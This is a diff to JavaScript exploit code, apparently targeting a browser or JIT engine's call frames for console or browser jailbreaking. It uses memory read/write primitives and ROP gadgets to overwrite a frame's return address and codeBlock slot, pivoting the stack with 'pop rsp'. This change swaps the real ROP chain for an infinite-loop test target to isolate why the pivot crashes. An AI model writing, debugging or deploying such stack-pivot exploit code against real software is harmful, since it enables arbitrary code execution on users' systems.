@@ -340,6 +340,9 @@ async function prepare(p) {
         p.write8(scratch, new int64(0, 0));
         const chainBuf = malloc(0x400);
         const chainEntry = chainBuf;
+        // Isolation stack for the pivot test: pivot lands here, which just loops.
+        const pivotBuf = malloc(0x20);
+        p.write8(pivotBuf, gaddr("infloop"));
 
         // slot indices into chainBuf that get patched at trigger time
         const S_RETSLOT = 6, S_ORIGRET = 8, S_CBSLOT = 11, S_ORIGCB = 13,
@@ -392,13 +395,16 @@ async function prepare(p) {
                 + "-origCB=0x" + origCB.toString()
                 + "-cbLooksHeap=" + cbLooksHeap);
 
-            // Overwrite: CF+0x10 = chainEntry, CF+0x08 = pop rsp. On the JS
-            // return, native ret pops CF+0x08 -> pop rsp -> rsp = [CF+0x10] =
-            // chainEntry -> chain runs, writes MAGIC, restores both slots, and
-            // returns cleanly into sort.
-            p.write8(cbSlot, chainEntry);
+            // ISOLATION TEST: same mechanism as the real chain (CF+0x08 = pop
+            // rsp, CF+0x10 = pivot target) but the target just loops. Outcomes:
+            //   HANG  -> pop rsp + CF+0x10 overwrite work; the earlier crash is
+            //            in my ROP chain body/return, not the pivot.
+            //   CRASH -> overwriting CF+0x10 (codeBlock) breaks the JIT return
+            //            epilogue; must pivot without touching CF+0x10.
+            p.write8(cbSlot, pivotBuf);
             p.write8(retSlot, gaddr("pop rsp"));
-            selfLog("SELF-PIVOT-FIRED", "armed; returning -> pivot now");
+            selfLog("SELF-PIVOT-FIRED", "cf+0x08=pop rsp, cf+0x10=pivotBuf[infloop]"
+                + " -- HANG=mechanism-ok, CRASH=cf+0x10-overwrite-breaks-return");
             return 0;
         };
         comparatorAddr = p.leakval(comparator);
